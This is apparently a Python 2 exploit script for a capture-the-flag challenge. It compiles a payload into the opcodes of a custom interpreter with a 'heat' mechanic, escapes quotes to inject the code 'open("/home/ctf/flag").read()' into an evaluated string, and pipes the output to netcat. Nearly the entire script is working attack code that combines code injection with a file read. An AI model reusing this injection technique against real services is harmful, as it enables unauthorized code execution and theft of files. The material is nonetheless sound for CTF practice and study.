#!/usr/bin/env python

import sys

instructions = {
        "+": ("CHANGE-DP", 4),      # add to dp
        "*": ("CHANGE-DPV", 7),     # add to data[dp]
        "_": ("MAYBE-JUMP", 2),     # jump if data == 0, otherwise skip
        "X": ("PRINT", 9),          # print string
        "M": ("MEDITATE", -1),      # decrease heat
        "D": ("DEBUG", 5),          # turn on debugging
}

revinst = {}
for o, d in instructions.items():
    (fn, h) = d
    revinst[fn] = (o, h)

def fromNumber(i):
    pos = "01234567"
    neg = "89ABCDEF"

    if i in range(0, 8):
        return pos[i]
    if i in range(-7, 0):
        return neg[-i]
    return None

def opc(o, p):
    mo = revinst["MEDITATE"][1]
    addedheat = revinst[o][1]
    heatfix = (revinst["MEDITATE"][0]+"0") * (-addedheat / mo)
    return "%s%s%s" % (revinst[o][0], fromNumber(p), heatfix)

def partnum(i, s):
    return (i/s, i%s)

def moveDP(i):
    out = ""

    if i >= 0:
        chunksize = 7
    else:
        chunksize = -7

    (ic, ir) = partnum(i, chunksize)


    for n in range(ic):
	out += opc("CHANGE-DP", chunksize)
    if ir != 0:
        out += opc("CHANGE-DP", ir)

    return out

def writeDP(i):
    out = ""

    if i >= 0:
        chunksize = 7
    else:
        chunksize = -7

    (ic, ir) = partnum(i, chunksize)


    for n in range(ic):
	out += opc("CHANGE-DPV", chunksize)
    if ir != 0:
        out += opc("CHANGE-DPV", ir)

    return out

def writeChar(x, i):
    return moveDP(i) + writeDP(x) + moveDP(-i)
    

toexec = 'open("/home/ctf/flag").read()'

toexec = '"+'+toexec+'+"' # escape the quotes

out = ""
out = "D0" # D0 enables debugging. Comment this out for no debugging

for idx, c in enumerate(toexec):
    out += writeChar(ord(c), idx)
print out + "X0"


# Usage: ./exploit.py | nc ...

